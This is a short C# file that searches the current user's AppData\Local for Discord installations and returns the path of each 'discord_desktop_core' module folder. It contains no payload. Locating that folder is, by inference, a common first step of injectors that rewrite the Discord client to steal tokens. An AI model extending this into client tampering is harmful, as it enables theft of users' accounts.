using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace sg1
{
    public static class PathFinder
    {
        public static List<string> GetInstallationPaths()
        {
            try
            {
                return Directory.GetDirectories($"C:\\Users\\{Environment.UserName}\\AppData\\Local")
                    .ToList()
                    .Where(x => x.Contains("Discord"))
                    .Select(x => Directory.GetDirectories(x, "discord_desktop_core*", SearchOption.AllDirectories)
                    .ToList()
                    .LastOrDefault())
                    .Where(item => !string.IsNullOrEmpty(item))
                    .ToList();
            }
            catch
            {
                return new List<string> { };
            }
        }
    }
}
